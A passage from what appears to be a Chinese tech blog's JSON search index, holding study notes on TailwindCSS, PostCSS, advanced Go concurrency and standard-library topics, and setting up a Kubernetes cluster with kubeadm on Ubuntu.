IntelliSense，让tailwindcss使用更舒适\n","permalink":"https://99999.fun/posts/130/","summary":"TailwindCSS是一个CSS框架，我个人理解这东西就是根据class来生成css（按需），而不是像bootstrap那样，TailwindCSS是原子化的\n安装\nnpm install tailwindcss\n初始化tailwind.config.js\nnpx tailwindcss init\n在tailwind.config.js中content属性，表示着项目的html或者js文件\ncontent: [\r'./src/**/*.{html,js}'\r],\r如果没有配置content属性，会警告\nwarn - The content option in your Tailwind CSS configuration is missing or empty. warn - Configure your content sources or your generated CSS will be missing styles. warn - https://tailwindcss.com/docs/content-configuration\n创建一个css文件配置tailwind三大组件（base，components.utilities）\n@tailwind base;\r@tailwind components;\r@tailwind utilities;\r如果使用的是webpacker或者postcss-import，不能使用@tailwind指令，需要\n@import \u0026quot;tailwindcss/base\u0026quot;;\r@import \u0026quot;tailwindcss/components\u0026quot;;\r@import \u0026quot;tailwindcss/utilities\u0026quot;;\r也可以将css导入到js中\nimport \u0026quot;tailwindcss/tailwind.css\u0026quot;\rtailwind编译\nnpx tailwindcss -i ./src/index.css -o ./dist/main.css","title":"简单使用TailwindCSS"},{"content":"PostCSS是一个用JS插件转换为css的插件工具（注意：PostCSS不是css预处理器，PostCSS本身是个平台，可以通过一些插件达到css预处理器的效果）\nPostCSS is a tool for transforming CSS with JS plugins. These plugins can support variables and mixins, transpile future CSS syntax, inline images, and more.\n插件查询：https://www.postcss.parts/\n常用插件：https://github.com/postcss/postcss/blob/main/docs/plugins.md\n安装\nnpm install postcss postcss-loader\n或者安装到项目中\nnpm install postcss postcss-loader \u0026ndash;save-dev\nPostCSS不单独使用，可搭配Gulp或者webpack使用（这里使用的是webpack）\nwebpack.config.js\nmodule.exports = {\rmodule: {\rrules: [\r{\rtest: /\\.css$/,\ruse: [\u0026quot;style-loader\u0026quot;, \u0026quot;css-loader\u0026quot;, \u0026quot;postcss-loader\u0026quot;]\r}\r]\r}\r};\rpostcss.config.js\nmodule.exports = {\rplugins: [插件1,插件2]\r};\rAutopreﬁxer（自动添加浏览器前缀）\nnpm install autoprefixer \u0026ndash;save-dev\nconst autoprefixer = require(\u0026quot;autoprefixer\u0026quot;) // 导入插件\rmodule.exports = {\rplugins: [autoprefixer] // 加载插件\r}\r执行打包命令npm run build\npostcss-preset-env（支持现代css语法）\nnpm install postcss-preset-env \u0026ndash;save-dev\nconst postcssPresetEnv = require(\u0026ldquo;postcss-preset-env\u0026rdquo;)\ncss-modules（css模块化）\nnpm install postcss-modules \u0026ndash;save-dev\nconst postcssModules = require(\u0026ldquo;postcss-modules\u0026rdquo;)\nstylelint（css代码检查）\nnpm install stylelint stylelint-config-standard \u0026ndash;save-dev\nconst StyleLintPlugin = require(\u0026ldquo;stylelint-webpack-plugin\u0026rdquo;)\n","permalink":"https://99999.fun/posts/129/","summary":"PostCSS是一个用JS插件转换为css的插件工具（注意：PostCSS不是css预处理器，PostCSS本身是个平台，可以通过一些插件达到css预处理器的效果）\nPostCSS is a tool for transforming CSS with JS plugins. These plugins can support variables and mixins, transpile future CSS syntax, inline images, and more.\n插件查询：https://www.postcss.parts/\n常用插件：https://github.com/postcss/postcss/blob/main/docs/plugins.md\n安装\nnpm install postcss postcss-loader\n或者安装到项目中\nnpm install postcss postcss-loader \u0026ndash;save-dev\nPostCSS不单独使用，可搭配Gulp或者webpack使用（这里使用的是webpack）\nwebpack.config.js\nmodule.exports = {\rmodule: {\rrules: [\r{\rtest: /\\.css$/,\ruse: [\u0026quot;style-loader\u0026quot;, \u0026quot;css-loader\u0026quot;, \u0026quot;postcss-loader\u0026quot;]\r}\r]\r}\r};\rpostcss.config.js\nmodule.exports = {\rplugins: [插件1,插件2]\r};\rAutopreﬁxer（自动添加浏览器前缀）\nnpm install autoprefixer \u0026ndash;save-dev","title":"PostCSS学习笔记"},{"content":"这篇笔记是进阶学习，如果基础没有看的的话，请去看https://xiaochenabc123.test.com/archives/96.html\n并发\ngo的并发靠goroutine，goroutine由go运行时调度，线程由操作系统调度，go还提供channel来给多个goroutine之间通行，goroutine和channel是go并发模式CSP（Communicating Sequential Process，通讯顺序进程）的实现基础，goroutine的调度在用户态下完成，不涉及内核态（比如内存的分配和释放，都是用户态维护的内存池，成本远比调度OS线程要低的多，可轻松做到成千上万个goroutine）\n内核态：程序执行操作系统层级的程序时\n用户态：程序执行用户自己写的程序时\n常见的并发模型有七种，分别是通讯顺序进程（CSP），数据级并行，函数式编程，线程与锁，Clojure，actor，Lambda架构\nCSP（Communicating Sequential Process，通讯顺序进程）：思想就是将两个并发执行的实体使用channel管道来连接起来，全部信息通过channel管道来传输，而且数据的传输是根据顺序来发送和接收的，CSP理论由托尼·霍尔提出\n小知识：托尼·霍尔（C.A.R.Hoare），图灵奖获得者，快速排序算法（Quick Sort）也出自这位之手\ngo的并发编程不需要像java那样维护线程池，go在语言层面内置了调度和上下文切换机制，只需要定义任务，让go运行时来智能合理的调度goroutine的任务给每个CPU，也不需要额外写什么进程，线程，协程，只需要写一个函数，开启一个goroutine就是可以实现并发了\nGo运行时会给main()函数建立一个默认的goroutine，当main()结束时，其他在main()执行的goroutine都会被结束（不管有没有执行完成）\ngoroutine的栈开始时为2kb（OS线程一般为2mb），而且栈不是固定的，可以增大和缩小，大小限制可以达到1GB\nGPM调度器是Go对CSP并发模型的实现，是Go自己开发的一套调度系统（GPM分别表示为Goroutine，Processor，Machine）\nGoroutine：go关键字创建的执行体，对应则结构体g，这个结构体存储着goroutine的堆栈信息\nProcessor：负责管理goroutine队列，存储则当前goroutine运行的上下文，会给自己管理的goroutine队列进行调度，例如：暂停goroutine，执行goroutine，当自己的队列处理完毕，将去全局队列中获取，全局队列处理完毕，还可以去其他P的队列去获取，用来处理G和M的通信\nMachine：G运行时对操作系统内核线程的虚拟化，映射内核线程（groutine就是被放到这个内核线程的映射虚拟化M中执行）\n简单来说就是P管理一组G在M上执行，当一个G阻塞在一个M时，Go运行时创建一个新的M，负责管理阻塞的那个G的P将其他G挂载在新的M上，G阻塞完成时或者G死掉了，回收旧的M\nP的个数通过runtime.GOMAXPROCS设置（最大256）（1.5版本后默认为计算机物理线程数）\nGPM调度器使用被称为m:n调度的技术（复用或者调度m个goroutine到n个OS线程）（可用runtime.GOMAXPROCS来控制OS线程的数量）\n因为底层OS线程的切换机制是根据时间轮询来切换的，因此goroutine的切换机制也是根据时间轮询来切换\nruntime.Gosched()：让当前任务让出线程占用，给其他任务执行\nruntime.Goexit()：终止当前任务\n通道是可被垃圾回收机制回收的，所以只有在告诉接收数据方，所有数据都已发送完毕了才需要关闭通道\n对已经关闭的管道发送数据，导致触发panic，同样关闭已经关闭的管道也会导致\n对已经关闭并且没有值的管道接收数据，将得到对应类型的零值，接收一个已经被关闭的管道，会一直接收数据，直到管道空了\n无缓冲区管道（阻塞管道）：要求管道的发送方和接收方交互是同步的，管道容量等于0的就是无缓冲管道，如果不能满足同步，将导致阻塞，要接收者准备完毕，发送者才能进行工作\n有缓冲区管道（非阻塞管道）：可以异步发送数据接收数据，只要缓冲区存在没有使用的空间，通信就是无阻塞的，可先发送数据再接收（因为有缓冲区），而且缓冲区管道可以保存数据（不需要取完数据）\n任务池：goroutine池，当goroutine任务完成，不kill该goroutine，而是获取下一个任务，并且继续执行该任务\n注意：go内置的map并不是并发安全的，只有使用channel或者sync.Map才是并发安全的\n锁可以避免并发冲突，但是锁对系统性能影响很大，原子操作可以减少这种消耗\n原子操作：指的是某个操作在执行中，其他协程不会看到没有执行完毕的结果，对于其他协程来说，只有原子操作完成了或者没开始，就好像原子一样，不被分割\n在多核中，某个核心读取某个数据是，会因为CPU缓存的原因，可能读取到的值不是最新的，在Go中，原子操作主要依赖于sync/atomic包\nsync/atomic包将原子操作封装成了Go的函数，sync/atomic包提供了底层的原子级内存操作\n因为Go不支持泛型，所以封装的函数很多（每个类型都有自己的原子操作函数，这里只写int64一个类型）\n增或减（被操作值增大或减少，只适合int和uint类型增减）：func AddInt64(addr *int64, delta int64) (new int64)\n载入（读取，避免读取过程，其他协程进行修改操作）：func LoadInt64(addr *int64) (val int64)\n存储（写入，避免写入过程，其他协程进行读取操作）：func StoreInt64(addr *int64, val int64)\n交换（和CAS不同，交换只赋值old值，不管原来的值）：func SwapInt64(addr *int64, new int64) (old int64)\n比较并且交换（Compare And Swap 简称CAS，类似于乐观锁，只有原来的值和传入的old值一样才修改）：func CompareAndSwapInt64(addr *int64, old, new int64) (swapped bool)\n使用方法：atomic.原子操作函数名\ngoroutine的特性：非阻塞（不等待），调度器不能保证多个goroutine的执行顺序，全部goroutine都是平等的（不存在父子关系）\n固定worker工作池（用固定数目的goroutine来作为工作线程池，提升并发能力），工作通道，结果通道，worker任务管道\n从worker任务管道获取任务到工作管道，处理完毕的结果传递到结果通道\ncontext标准库（go1.7版本以及之后版本），用来跟踪goroutine调用树（因为goroutine不存在父子关系，无法靠语法来通知）\nContext接口：所有的context对象都要实现该接口，一般用来当作context对象的参数类型，该接口定义了4个需要实现的方法，分别是Deadline()，Done()，Err()，Value()\nDeadline()方法：需要返回当前Context被取消的时间（完成工作截止时间） Done()方法：需要返回一个channel，这个管道会在当前工作完成或者上下文被取消之后关闭 Err()方法：返回当前Context结束的原因 Value()方法：会从Context中返回键对应的值\ncanceler接口：规定了通知取消的Context对象要实现的接口\nempty Context结构：实现了Context接口，但是不具备任何功能（该结构体的方法是空方法），该结构被用来当做Context对象树的根（root节点），模拟一个真的goroutine树\ncancelCtx类型：实现了Context接口的具体类型，并且同时实现了canceler接口，不但具备退出通知功能，还能将退出通知告诉整个children节点\ntimerCtx类型：实现了Context接口的具体类型，并且封装了cancelCtx类型实例，具备一个deadline变量，用来实现定时退出通知\nvalueCtx类型：实现了Context接口的具体类型，并且封装了Context接口实例，具备一个k/v的存储变量，用来传递通知\ngo内置的net/http包提供了http客户端和服务端的实现，性能媲美nginx（每一个请求都有一个对应的goroutine去处理，并发性能好）\nhttp服务端\nfunc h(w http.ResponseWriter, r *http.Request) {\rfmt.Println(r.RemoteAddr, \u0026quot;连接成功\u0026quot;)\rfmt.Println(r.Method, r.URL.Path, r.Body, r.Header)\rstr := \u0026quot;hallo word\u0026quot;\rw.Write([]byte(str))\r}\rfunc main() {\rhttp.HandleFunc(\u0026quot;/test\u0026quot;, h)\rhttp.ListenAndServe(\u0026quot;127.0.0.1:8080\u0026quot;, nil)\r}\r访问http://127.0.0.1:8080/test，就可以看到hallo word了，控制台还是输出一些有关请求的信息\nhttp客户端（get请求，这个东西也可以用来做go爬虫）\nres, err := http.Get(\u0026quot;https://xiaochenabc123.test.com\u0026quot;)\rif err != nil {\rfmt.Println(err)\r}\rbody, err := ioutil.ReadAll(res.Body)\rif err != nil {\rfmt.Println(err)\r}\rfmt.Println(string(body))\rget参数通过r.URL.Query()进行识别\npost请求\nresp, err := http.Post(\u0026quot;https://xiaochenabc123.test.com\u0026quot;, \u0026quot;application/x-www-form-urlencoded\u0026quot;, strings.NewReader(\u0026quot;test=hallo word\u0026quot;))\rif err != nil {\rfmt.Println(err)\r}\rdefer resp.Body.Close()\rbody, err := ioutil.ReadAll(resp.Body)\rfmt.Println(string(body))\r日志标准库log（log包是go内置的）\nlog.Println() 普通日志 log.Fatalln() 会触发fatal的日志，写入日志后调用os.Exit(1) log.Panicln() 会触发panic的日志，写入日志后panic\nlog会打印日志信息的日期，时间，以及日志信息\n可通过log.SetOutput()存储日志到文件中\n日志等级（从小到大，默认输出Debug及其以上基本的日志）：\nlog.Trace（基本输出），log.Debug（调试），log.Info（重要），log.Warning（警告），log.Error（错误），CRIT（严重危险）, ALRT（严重警告），log.Fatal（严重紧急）\ngo test测试工具\n在包目录中，所有以_test.go为后缀名的文件，都认为是go test的一部分，不会被go build编译到可执行文件中\n在这些以_test.go为后缀名的文件中的函数，分为3种类型，单元测试函数，基准测试函数和示例函数\n单元测试函数：函数名前缀以Test开头的，用来测试程序的逻辑是否正常\n基准测试函数：函数名前缀以Benchmark开头的，测试函数的性能\n示例函数：函数名前缀以Example开头的，提供示例\ngo test会遍历这些符合规则的函数，并且生成临时的main包来调用测试函数，执行，返回测试结果，最后清理临时测试文件\n测试函数必须要导入testing包，例如：func TestData(t *testing.T){}\n基准测试函数：func BenchmarkData(b *testing.B)\n示例函数：func ExampleData()\ngo变量如果在声明时没有指定初始值，那么该变量初始值为该变量的类型的零值\n:=声明方式只能出现在函数中（由go自动判断类型）\ngo提供自动垃圾回收（Garbage Collector）机制，不需要关注变量的内存管理，go使用逃逸分析(Escape Analysis)技术\ngo会为变量在两个地方分配内存空间，这两个地方分别是全局的堆(heap)空间和每个goroutine的栈(stack)空间，因为go是自动管理内存空间的，不需要关心这些，但是栈内存和堆内存在性能差别很大\n如果分配到栈中，那么当函数执行完毕后自动回收，如果是分配到堆中，会在函数执行完毕后某个时间点进行垃圾回收，而且在栈上分配内存或者回收内存花销都很低，只需要PUSH（将数据PUSH到栈空间）和POP（释放空间）两个CPU指令，因此只是将数据PUSH到内存的时间，效率和内存的I/O成正比\n如果是堆中，因为go语言垃圾回收用的是标记清除算法（GC，垃圾回收）（标记要查找存活的对象，清除要遍历堆的全部对象，回收没有标记的对象）（题外知识：JavaScript垃圾回收就是用的这个标记清除算法）\n逃逸分析(Escape Analysis)：由编译器决定变量是分配到栈空间还是堆空间，当变量的作用域在函数内部，那么该变量是分配到栈空间上，反之则分配在堆空间，也就是说当变量不能随着函数结束而回收时分配在堆空间（指针逃逸），另外空接口在编译阶段难确定其参数的类型，也会发生逃逸，闭包也会逃逸\n另外当栈空间不足也会发生逃逸（因为栈溢出），栈空间被操作系统所限制大小（当栈空间不足时，发生栈溢出）\n利用逃逸分析原理提升性能：一般情况下，占用大内存的变量应该使用传指针（堆空间，虽然GC性能没有栈空间那么好，但是传指针只复制指针地址，不对值的拷贝），小内存的变量用传值（栈空间，可获得更好的性能）\n反射：指程序在执行过程中，可以访问，监测和修改本身状态和行为的能力\nGo语言提供了一种机制在运行时更新变量和检查它们的值，调用它们的方法，但是在编译时并不知道这些变量的具体类型，这称为反射机制\nGo的反射基础是接口和类型系统，借助接口自动创建的数据结构实现，反射依赖于interface类型，反射的实现靠reflect标准库\nGo语言类型分为2大类，static type和concrete type，其中static type是int，string这些在编码时能看到的类型，concrete type是runtime系统才能看见的类型（类型断言依赖于concrete type）\n因为Go语言是静态语言，在编译阶段已经被确定了类型，使用interface类型的变量有一个pair，pair被用来记录了实际变量的值和类型，并且这个变量有2个指针，一个指向concrete type，另一个指向实际值\nreflect.TypeOf()：该函数的参数是一个空接口类型，返回值为一个type接口类型，返回一个type的接口变量，通过接口抽象出来的方法访问具体类型的信息（用来获取反射对象pair的type）\nreflect.ValueOf()：该函数的参数是一个空接口类型，返回值为一个Value类型的变量（用来获取pair的value对象），\nreflect.Kind()方法：该方法没有参赛，返回值是字符串类型（用来获取具体类型struct）\n例如：\ntype Testint int64\rvar num Testint = 666\rfmt.Println(\u0026quot;type: \u0026quot;, reflect.TypeOf(num))\rfmt.Println(\u0026quot;value: \u0026quot;, reflect.ValueOf(num))\rfmt.Println(\u0026quot;kind: \u0026quot;, reflect.TypeOf(num).Kind())\rGo 交叉编译（在一个平台上生成另一个平台的可执行程序）（Mac/Linux/Windows下）\nWindows下编译Mac,Linux\nLinux\nSET CGO_ENABLED=0 SET GOOS=linux SET GOARCH=amd64 go build main.go\nMac\nSET CGO_ENABLED=0 SET GOOS=darwin SET GOARCH=amd64 go build main.go\nLinux下编译Mac,Windows\nWindows\nCGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go\nMac\nCGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build main.go\nMac下编译Linux,Windows\nLinux\nCGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go\nWindows\nCGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go\n其中CGO_ENABLED=0来控制go build是否使用CGO编译器，1为使用CGO编译器，GOOS表示编译成什么平台的（linux/windows/darwin/freebsd）,GOARCH表示编译成什么平台的体系架构（386/amd64/arm，32位，64位，ARM）\n注意：CGO是Go代码中调用C代码交叉编译，但是交叉编译不支持CGO，因此如果存在C代码是不能编译的，需要禁用CGO\ndep包管理工具\n命令行参数解析（依赖于内置flag包）\n导入flag包\nimport flag\n定义参数\npass := flag.String(\u0026quot;pass\u0026quot;, \u0026quot;123\u0026quot;, \u0026quot;密码\u0026quot;)\r可以看到flag.Type方法接收3个参数，分别是flag名，默认值，提示\nflag支持Int，Int64，Uint，Uint64，Float，Float64，String，Bool，Duration（时间间隔）等类型\n还有一种定义参数的方式\nvar pass string\rflag.StringVar(\u0026amp;pass, \u0026quot;pass\u0026quot;, \u0026quot;123\u0026quot;, \u0026quot;密码\u0026quot;)\r定义完毕参数后，使用flag.Parse()解析，命令行中指定pass，pass的数据将会保存在pass变量中\nflag其他常用函数\n返回命令行参数后（未定义的参数）的其他参数 flag.Args()\n返回命令行参数后（未定义的参数）的其他参数个数 flag.NArg()\n返回命令行参数（定义的）的个数 flag.NFlag()\n例如：\nfunc main() {\rvar pass string\rflag.StringVar(\u0026amp;pass, \u0026quot;pass\u0026quot;, \u0026quot;123\u0026quot;, \u0026quot;密码\u0026quot;)\rflag.Parse()\rfmt.Println(pass)\rfmt.Println(flag.Args())\rfmt.Println(flag.NArg())\rfmt.Println(flag.NFlag())\r}\r./test -pass hallo\n可使用-help参数查看参数提示\n","permalink":"https://99999.fun/posts/128/","summary":"这篇笔记是进阶学习，如果基础没有看的的话，请去看https://xiaochenabc123.test.com/archives/96.html\n并发\ngo的并发靠goroutine，goroutine由go运行时调度，线程由操作系统调度，go还提供channel来给多个goroutine之间通行，goroutine和channel是go并发模式CSP（Communicating Sequential Process，通讯顺序进程）的实现基础，goroutine的调度在用户态下完成，不涉及内核态（比如内存的分配和释放，都是用户态维护的内存池，成本远比调度OS线程要低的多，可轻松做到成千上万个goroutine）\n内核态：程序执行操作系统层级的程序时\n用户态：程序执行用户自己写的程序时\n常见的并发模型有七种，分别是通讯顺序进程（CSP），数据级并行，函数式编程，线程与锁，Clojure，actor，Lambda架构\nCSP（Communicating Sequential Process，通讯顺序进程）：思想就是将两个并发执行的实体使用channel管道来连接起来，全部信息通过channel管道来传输，而且数据的传输是根据顺序来发送和接收的，CSP理论由托尼·霍尔提出\n小知识：托尼·霍尔（C.A.R.Hoare），图灵奖获得者，快速排序算法（Quick Sort）也出自这位之手\ngo的并发编程不需要像java那样维护线程池，go在语言层面内置了调度和上下文切换机制，只需要定义任务，让go运行时来智能合理的调度goroutine的任务给每个CPU，也不需要额外写什么进程，线程，协程，只需要写一个函数，开启一个goroutine就是可以实现并发了\nGo运行时会给main()函数建立一个默认的goroutine，当main()结束时，其他在main()执行的goroutine都会被结束（不管有没有执行完成）\ngoroutine的栈开始时为2kb（OS线程一般为2mb），而且栈不是固定的，可以增大和缩小，大小限制可以达到1GB\nGPM调度器是Go对CSP并发模型的实现，是Go自己开发的一套调度系统（GPM分别表示为Goroutine，Processor，Machine）\nGoroutine：go关键字创建的执行体，对应则结构体g，这个结构体存储着goroutine的堆栈信息\nProcessor：负责管理goroutine队列，存储则当前goroutine运行的上下文，会给自己管理的goroutine队列进行调度，例如：暂停goroutine，执行goroutine，当自己的队列处理完毕，将去全局队列中获取，全局队列处理完毕，还可以去其他P的队列去获取，用来处理G和M的通信\nMachine：G运行时对操作系统内核线程的虚拟化，映射内核线程（groutine就是被放到这个内核线程的映射虚拟化M中执行）\n简单来说就是P管理一组G在M上执行，当一个G阻塞在一个M时，Go运行时创建一个新的M，负责管理阻塞的那个G的P将其他G挂载在新的M上，G阻塞完成时或者G死掉了，回收旧的M\nP的个数通过runtime.GOMAXPROCS设置（最大256）（1.5版本后默认为计算机物理线程数）\nGPM调度器使用被称为m:n调度的技术（复用或者调度m个goroutine到n个OS线程）（可用runtime.GOMAXPROCS来控制OS线程的数量）\n因为底层OS线程的切换机制是根据时间轮询来切换的，因此goroutine的切换机制也是根据时间轮询来切换\nruntime.Gosched()：让当前任务让出线程占用，给其他任务执行\nruntime.Goexit()：终止当前任务\n通道是可被垃圾回收机制回收的，所以只有在告诉接收数据方，所有数据都已发送完毕了才需要关闭通道\n对已经关闭的管道发送数据，导致触发panic，同样关闭已经关闭的管道也会导致\n对已经关闭并且没有值的管道接收数据，将得到对应类型的零值，接收一个已经被关闭的管道，会一直接收数据，直到管道空了\n无缓冲区管道（阻塞管道）：要求管道的发送方和接收方交互是同步的，管道容量等于0的就是无缓冲管道，如果不能满足同步，将导致阻塞，要接收者准备完毕，发送者才能进行工作\n有缓冲区管道（非阻塞管道）：可以异步发送数据接收数据，只要缓冲区存在没有使用的空间，通信就是无阻塞的，可先发送数据再接收（因为有缓冲区），而且缓冲区管道可以保存数据（不需要取完数据）\n任务池：goroutine池，当goroutine任务完成，不kill该goroutine，而是获取下一个任务，并且继续执行该任务\n注意：go内置的map并不是并发安全的，只有使用channel或者sync.Map才是并发安全的\n锁可以避免并发冲突，但是锁对系统性能影响很大，原子操作可以减少这种消耗\n原子操作：指的是某个操作在执行中，其他协程不会看到没有执行完毕的结果，对于其他协程来说，只有原子操作完成了或者没开始，就好像原子一样，不被分割\n在多核中，某个核心读取某个数据是，会因为CPU缓存的原因，可能读取到的值不是最新的，在Go中，原子操作主要依赖于sync/atomic包\nsync/atomic包将原子操作封装成了Go的函数，sync/atomic包提供了底层的原子级内存操作\n因为Go不支持泛型，所以封装的函数很多（每个类型都有自己的原子操作函数，这里只写int64一个类型）\n增或减（被操作值增大或减少，只适合int和uint类型增减）：func AddInt64(addr *int64, delta int64) (new int64)\n载入（读取，避免读取过程，其他协程进行修改操作）：func LoadInt64(addr *int64) (val int64)\n存储（写入，避免写入过程，其他协程进行读取操作）：func StoreInt64(addr *int64, val int64)\n交换（和CAS不同，交换只赋值old值，不管原来的值）：func SwapInt64(addr *int64, new int64) (old int64)\n比较并且交换（Compare And Swap 简称CAS，类似于乐观锁，只有原来的值和传入的old值一样才修改）：func CompareAndSwapInt64(addr *int64, old, new int64) (swapped bool)","title":"Golang进阶扩展笔记"},{"content":"Kubernetes（k8s，8是指k到s之间有8个字母），是谷歌在2014年发布并且开源的容器化集群管理系统（已在谷歌生产环境中工作15年），支持自动化部署，应用容器化管理，大规模升级或回滚，应用扩展等等\nk8s的特性：\n自动部署与滚动更新：自动化部署应用容器，k8s采取滚动式更新，可以根据应用的情况进行一次或者批量更新（判断该应用添加是否正常使用），也可以进行历史版本回滚\n自我修复：当某个容器发生故障，会自动重新启动失败的容器，当某个节点（Pod）出现故障进行容器的替换或者重新部署，并且关闭没有通过检查的容器（不进行处理请求，保证服务不中断），直到容器恢复正常\n弹性伸缩：通过命令，UI界面，CPU等资源使用情况，自动对应用容器进行扩容或者缩容，保证在高峰期的高可用性，降低运行成本\n服务发现和负载均衡：k8s为容器对外提供了统一访问入口（api server），并且关联全部容器（负载均衡）\n密钥与配置管理：允许在不重新构建容器（不需要重新集群，热更新）的情况下更新应用程序配置，可以存储和管理密钥，令牌等敏感信息，不需要暴露这些敏感信息（部署和更新密钥）\n存储编排：支持挂载外部存储（网络存储服务，云存储服务）（本地当然是支持），自动完成存储系统的挂载以及应用，保证数据持久化\n批处理：支持一次性任务，定时任务\nk8s的集群架构分为2个组件，分别为master（主控节点）和node（工作节点）\nmaster组件：api server（集群统一人口，restful），scheduler（节点调度，调度node节点应用部署），controller-manager（处理集群中后台任务，一个资源对应一个控制器，资源控制），etcd（存储系统，用来存储集群的相关数据）\nnode组件：kubelet（node节点代理，管理k8s容器），kube-proxy（负责网络代理，负载均衡等操作）\nPod：k8s管理系统中最小部署单位，一个或者多个容器的集合（共享同一个网络），容器重启将结束该pod的生命（生命周期短）\nService\nVolume\nNamespace\nController：控制器（确保预期pod的数量），状态应用部署（无状态（没有任何限制约定），有状态（有限制条件，依赖需要））负责一次性任务，定时任务，守护进程等等，确保所有node运行同一个pod\nService Ingress：对外接口（定义pod的访问规则）\nRBAC：安全机制，权限管理\nHelm：包管理器，快速下载，安装软件\nk8s集群搭建\n单master集群：单个master节点，管理多个node节点\n多master集群（高可用集群）：多个master节点，管理多个node节点，中间存在着负载均衡的过程\nkubeadm\nkubeadm是k8s部署工具，用于快速部署k8s集群\n官方文档：https://kubernetes.io/zh/docs/setup/production-environment/tools/kubeadm/install-kubeadm/\nkubeadm安装\n安装必备软件\napt install -y apt-transport-https ca-certificates curl\n添加k8s国内源\nsudo tee /etc/apt/sources.list.d/kubernetes.list \u0026laquo;-\u0026lsquo;EOF\u0026rsquo; deb https://mirrors.tencent.com/kubernetes/apt/ kubernetes-xenial main EOF\n添加签名\ngpg \u0026ndash;keyserver keyserver.ubuntu.com \u0026ndash;recv-keys 836F4BEB gpg \u0026ndash;export \u0026ndash;armor 836F4BEB | sudo apt-key add - apt update\n836F4BEB这个为NO_PUBKEY的后8位\n安装三件套\napt install -y kubelet kubeadm kubectl\n创建master节点\nkubeadm init\n将node节点添加到当前集群中\nkubeadm join master节点ip和端口 \u0026ndash;token 令牌\n默认令牌有效期24小时，过期要重新生成\n查看默认令牌\nkubeadm token create \u0026ndash;print-join-command\n生成新的令牌\nkubeadm token create\n查看存在的node节点\nkubectl get nodes\n安装flannel（刚开始的状态是NotReady，需要安装flannel网络插件来联网）\nkubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml\n删除node节点\nkubectl delete node node1\nk8s节点名称默认根据主机名命名\n拉取第一个镜像，并且启动该镜像，并且对外暴露容器内部的80端口\nkubectl create deployment nginx \u0026ndash;image=nginx \u0026ndash;port=80\n使用kubectl get pod 查看容器的状态，如果status为running表示已经启动\n通过kubectl get pod,svc 查看对外暴露的端口\n通过 kubectl describe deployment nginx 查看该容器的详细信息\n这边使用的是ubuntu-20.04-live-server-amd64，虚拟机（网络连接方式为桥接）\n配置方面是4GB内存，2处理器，30GB存储\nmaster1：192.168.1.102 node1：192.168.1.105 node2：192.168.1.104\n一些初始化操作\n更换系统软件源\nvim /etc/apt/sources.list\n这边用的腾讯源（https://mirrors.cloud.tencent.com/ubuntu/）\ndeb https://mirrors.cloud.tencent.com/ubuntu/ focal main restricted universe multiverse\rdeb https://mirrors.cloud.tencent.com/ubuntu/ focal-security main restricted universe multiverse\rdeb https://mirrors.cloud.tencent.com/ubuntu/ focal-updates main restricted universe multiverse\rdeb https://mirrors.cloud.tencent.com/ubuntu/focal-backports main restricted universe multiverse\r# deb-src https://mirrors.cloud.tencent.com/ubuntu/ focal main restricted universe multiverse\r# deb-src https://mirrors.cloud.tencent.com/ubuntu/ focal-security main restricted universe multiverse\r# deb-src https://mirrors.cloud.tencent.com/ubuntu/ focal-updates main restricted universe multiverse\r# deb-src https://mirrors.cloud.tencent.com/ubuntu/ focal-backports main restricted universe multiverse\r# 预发布软件源，不建议启用\r# deb https://mirrors.cloud.tencent.com/ubuntu/ focal-proposed main restricted universe multiverse\r# deb-src https://mirrors.cloud.tencent.com/ubuntu/ focal-proposed main restricted universe multiverse\rapt update\napt upgrade\n关闭防火墙\nsudo ufw disable\n关闭swap\nsudo swapoff -a\n可以使用free -m或者top检查\n设置主机名（因为我在创建虚拟机的时候已经设置了）\nsudohostnamectl set-hostname 主机名\n设置hosts\nsudo vim /etc/hosts\n192.168.1.102 master1 192.168.1.105 node1 192.168.1.104 node2\nselinux（ubuntu默认没有这个东西，不用管）\n桥接的IPV4流量传递到iptables的链\ncat \u0026gt; /etc/sysctl.d/k8s.conf \u0026laquo; EOF net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-iptables = 1 EOF\n生效配置 sysctl \u0026ndash;system\n时间同步\napt install ntpdate ntpdate cn.pool.ntp.org hwclock \u0026ndash;systohc\n设置时区\nsudo timedatectl set-timezone Asia/Shanghai\n写入硬件时钟\nsudo timedatectl set-local-rtc 0\n(Kubernetes从v1.20版本开始弃用Docker)\n","permalink":"https://99999.fun/posts/127/","summary":"Kubernetes（k8s，8是指k到s之间有8个字母），是谷歌在2014年发布并且开源的容器化集群管理系统（已在谷歌生产环境中工作15年），支持自动化部署，应用容器化管理，大规模升级或回滚，应用扩展等等\nk8s的特性：\n自动部署与滚动更新：自动化部署应用容器，k8s采取滚动式更新，可以根据应用的情况进行一次或者批量更新（判断该应用添加是否正常使用），也可以进行历史版本回滚\n自我修复：当某个容器发生故障，会自动重新启动失败的容器，当某个节点（Pod）出现故障进行容器的替换或者重新部署，并且关闭没有通过检查的容器（不进行处理请求，保证服务不中断），直到容器恢复正常\n弹性伸缩：通过命令，UI界面，CPU等资源使用情况，自动对应用容器进行扩容或者缩容，保证在高峰期的高可用性，降低运行成本\n服务发现和负载均衡：k8s为容器对外提供了统一访问入口（api server），并且关联全部容器（负载均衡）\n密钥与配置管理：允许在不重新构建容器（不需要重新集群，热更新）的情况下更新应用程序配置，可以存储和管理密钥，令牌等敏感信息，不需要暴露这些敏感信息（部署和更新密钥）\n存储编排：支持挂载外部存储（网络存储服务，云存储服务）（本地当然是支持），自动完成存储系统的挂载以及应用，保证数据持久化\n批处理：支持一次性任务，定时任务\nk8s的集群架构分为2个组件，分别为master（主控节点）和node（工作节点）\nmaster组件：api server（集群统一人口，restful），scheduler（节点调度，调度node节点应用部署），controller-manager（处理集群中后台任务，一个资源对应一个控制器，资源控制），etcd（存储系统，用来存储集群的相关数据）\nnode组件：kubelet（node节点代理，管理k8s容器），kube-proxy（负责网络代理，负载均衡等操作）\nPod：k8s管理系统中最小部署单位，一个或者多个容器的集合（共享同一个网络），容器重启将结束该pod的生命（生命周期短）\nService\nVolume\nNamespace\nController：控制器（确保预期pod的数量），状态应用部署（无状态（没有任何限制约定），有状态（有限制条件，依赖需要））负责一次性任务，定时任务，守护进程等等，确保所有node运行同一个pod\nService 